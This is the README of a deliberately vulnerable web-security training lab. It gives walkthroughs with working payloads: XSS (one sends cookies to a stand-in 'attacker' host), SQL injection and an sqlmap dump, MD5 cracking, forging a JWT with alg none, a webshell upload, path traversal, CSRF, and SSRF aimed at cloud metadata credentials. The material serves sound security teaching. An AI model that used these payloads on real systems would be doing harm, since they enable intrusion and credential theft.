# VulnLab — Security Training Platform

> **FOR AUTHORISED INTERNAL TRAINING ONLY.**  
> This application is deliberately insecure. Never expose it to the public internet.

---

## Overview

VulnLab is a self-hosted, Docker-based web security training platform covering all major OWASP Top 10 vulnerability classes. Designed for teams to practice penetration testing in a safe, controlled, isolated environment.

### Labs Included

| Lab | Vulnerability | OWASP | Points |
|-----|--------------|-------|--------|
| XSS Reflected | User input echoed raw into HTML | A03 | 100 |
| XSS Stored | Malicious comment persists to all users | A03 | 200 |
| XSS DOM | `innerHTML` from `location.hash` | A03 | 200 |
| SQLi Login Bypass | Raw string concat in login query | A03 | 100 |
| SQLi UNION SELECT | Extract users/products via UNION | A03 | 200 |
| SQLi Blind | Boolean-based blind inference | A03 | 300 |
| Auth: Weak Hashes | MD5 unsalted passwords | A02 | 150 |
| Auth: JWT None Alg | JWT signature bypass | A02/A07 | 250 |
| Auth: IDOR Profile | Unguarded user ID parameter | A01 | 150 |
| File Upload | Missing MIME/extension validation | A05 | 300 |
| Path Traversal | Unsanitized file path param | A01 | 250 |
| CSRF | No token on email-change form | A01/A05 | 200 |
| SSRF | Server fetches attacker-supplied URL | A10 | 300 |

**Total: 2,700 points across 13 flags**

---

## Quick Start

### Prerequisites
- Docker ≥ 24
- Docker Compose ≥ 2.x

### 1. Clone / copy the project
```bash
git clone <your-repo> vulnlab
cd vulnlab
```

### 2. Start
```bash
docker compose up --build -d
```

### 3. Access
| URL | Description |
|-----|-------------|
| http://localhost:8080 | Main VulnLab app |
| http://localhost:8080/admin/ | Instructor admin panel |

### 4. Default credentials
| Account | Username | Password |
|---------|----------|----------|
| App admin | admin | admin123 |
| Admin panel | (any) | admin123 |

> Change `ADMIN_PASSWORD` in `docker-compose.yml` before running in a shared lab.

---

## Team / Classroom Setup

### LAN access (colleagues on same network)
1. Find your machine's LAN IP: `ip addr` / `ipconfig`
2. Share `http://<YOUR_IP>:8080` — everyone can access the labs
3. Each trainee registers their own username to track personal progress

### Isolate completely (no internet egress)
In `docker-compose.yml`, set the network to internal:
```yaml
networks:
  vulnnet:
    driver: bridge
    internal: true
```

### VPN-only access
Run on a server and access via VPN. Port 8080 only needs to be reachable inside the VPN.

---

## Lab Walkthroughs

### Lab 1 — Reflected XSS
**URL:** `/xss/reflected?q=<payload>`

```
Payload: <script>alert(document.cookie)</script>
URL:     http://localhost:8080/xss/reflected?q=<script>alert(1)</script>
```

**What's happening:** The `q` parameter value is directly interpolated into the HTML template with no encoding.  
**Fix:** `res.send(escapeHtml(query))` — encode `<`, `>`, `"`, `'`, `&`.

---

### Lab 2 — Stored XSS
**URL:** `/xss/stored`

```
Comment content: <img src=x onerror="fetch('http://attacker/?c='+document.cookie)">
```

**What's happening:** Comment is stored in SQLite and rendered raw for every visitor.  
**Fix:** Sanitize before storing (DOMPurify server-side), or encode on render.

---

### Lab 3 — DOM XSS
**URL:** `/xss/dom#<payload>`

```
Navigate to: http://localhost:8080/xss/dom#<img src=x onerror=alert(1)>
```

**What's happening:** `location.hash` is passed to `innerHTML` with no sanitization.  
**Fix:** Use `textContent` instead of `innerHTML`, or sanitize with DOMPurify.

---

### Lab 4 — SQL Injection Login Bypass
**URL:** POST `/sqli/login`

```
Username: ' OR '1'='1' --
Password: (anything)

Query becomes: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
```

**Fix:** Use parameterized queries: `db.prepare("SELECT * FROM users WHERE username=? AND password=?").get(u, p)`

---

### Lab 5 — UNION SELECT
**URL:** `/sqli/search?q=<payload>`

```
Payload: ' UNION SELECT id,username,password,role FROM users --
Payload: ' UNION SELECT id,name,secret,price FROM products --
```

**Fix:** Parameterized queries + principle of least privilege on DB user.

---

### Lab 6 — Blind SQLi
**URL:** `/sqli/blind?id=<payload>`

```
Payload: 1 AND SUBSTR((SELECT username FROM users WHERE role='admin' LIMIT 1),1,1)='a'
```

Automate with sqlmap:
```bash
sqlmap -u "http://localhost:8080/sqli/blind?id=1" --dbms=sqlite --dump --level=3 --risk=2 --batch
```

---

### Lab 7 — Weak Password Hashes
**URL:** `/auth/hashes`

1. Visit the page — all MD5 hashes are exposed (IDOR)
2. Paste into https://crackstation.net
3. Or crack locally:
```bash
echo "0192023a7bbd73250516f069df18b500" > hash.txt
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# or
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Lab 8 — JWT Algorithm Confusion
**URL:** `/auth/jwt-demo`

1. Get your token from the page
2. Decode at https://jwt.io
3. Forge with Python:
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"username": "attacker", "role": "admin", "iat": 9999999999})
token   = f"{header}.{payload}."
print(token)
```
4. Submit the forged token to `/auth/jwt-verify`

---

### Lab 9 — IDOR
**URL:** `/auth/profile/1` → `/auth/profile/5`

Simply increment the ID in the URL. No session check is performed.  
Profile 5 (`secretuser`) contains a flag in the bio.

---

### Lab 10 — File Upload Bypass
**URL:** `/upload`

The filter only blocks `.php`. Try:
```
shell.php5
shell.phtml
shell.pHp    (case bypass)
shell.html   (XSS via upload)
shell.js     (Node webshell concept)
```

Sample upload payload (HTML webshell demo):
```html
<html><body>
<form method="GET">
  <input name="cmd"><button>Run</button>
</form>
<pre id="o"></pre>
<script>
  const p = new URLSearchParams(location.search);
  if(p.get('cmd')) fetch('/exec?c='+p.get('cmd')).then(r=>r.text()).then(t=>document.getElementById('o').textContent=t);
</script>
</body></html>
```

---

### Lab 11 — Path Traversal
**URL:** `/upload/download?file=<payload>`

```
/upload/download?file=../../etc/passwd
/upload/download?file=..%2F..%2Fetc%2Fpasswd
/upload/download?file=....//....//etc/passwd
```

**Fix:** `path.resolve()` + check result starts with `UPLOAD_DIR`.

---

### Lab 12 — CSRF
1. Login as `alice` (crack her MD5 first: `md5("password")`)
2. While logged in, open `/csrf/poc` in another tab
3. The page auto-submits a form changing alice's email to `hacked@attacker.evil`
4. The server has no CSRF token — request is accepted

**Fix:** Use `csurf` middleware, SameSite=Strict cookies, or check `Origin` header.

---

### Lab 13 — SSRF
**URL:** POST `/api/fetch` with `url=<target>`

```bash
# Probe internal admin panel
curl -X POST http://localhost:8080/api/fetch -d "url=http://admin:4000/"

# Probe Redis
curl -X POST http://localhost:8080/api/fetch -d "url=http://redis:6379/"

# AWS metadata (if deployed on EC2/ECS)
curl -X POST http://localhost:8080/api/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fix:** Allowlist of permitted domains, block RFC1918 ranges, use a dedicated egress proxy.

---

## Using OWASP ZAP

1. Start ZAP
2. Set browser proxy to `127.0.0.1:8080` (ZAP's proxy)
3. Browse VulnLab normally — ZAP will populate the sitemap
4. Right-click VulnLab in the Sites tree → Active Scan
5. Review alerts in the Alerts tab

Or run automated spider:
```bash
# ZAP CLI
zap-cli start --start-options '-config api.disablekey=true'
zap-cli open-url http://localhost:8080
zap-cli spider http://localhost:8080
zap-cli active-scan http://localhost:8080
zap-cli report -o zap_report.html -f html
```

---

## Using Burp Suite

1. Open Burp → Proxy → turn Intercept On
2. Configure browser to use Burp proxy (127.0.0.1:8080)
3. Browse to each lab
4. In Proxy → HTTP History, right-click interesting requests → Send to Repeater / Intruder
5. Use Intruder for parameter fuzzing (SQLi payloads, wordlists)
6. Use Scanner (Pro) for automated vulnerability detection

---

## Admin Panel

Access at `http://localhost:8080/admin/` — password `admin123`

| Feature | Description |
|---------|-------------|
| Dashboard | Live stats — users, solves, uploads, log lines |
| Users | Add/delete users, reset individual scores |
| Score Matrix | Visual grid of who solved which flags |
| Flags | All flag values, solve counts, add custom flags |
| Traffic Log | Full HTTP request log with filtering |
| Reset Labs | Clear XSS comments, uploads, all scores |
| Hints | Quick reference cheat sheet for instructors |
| Broadcast | Post announcements visible on the app |

---

## Adding Your Own Labs

1. Create `app/routes/mylab.js` following the pattern of existing routes
2. Register it in `app/server.js`: `app.use("/mylab", require("./routes/mylab"))`
3. Add a flag to the database via the admin panel or in `db/seed.js`
4. Add a card to `routes/home.js`

---

## Security Notes

- `internal: true` on the Docker network completely blocks outbound internet from containers
- All labs reset cleanly via the admin panel between sessions
- Traffic log captures all requests — trainees can review their own attack payloads
- Never use real credentials or real data in VulnLab
- Never expose port 8080 to the internet

---

## License

MIT — for internal security training only.
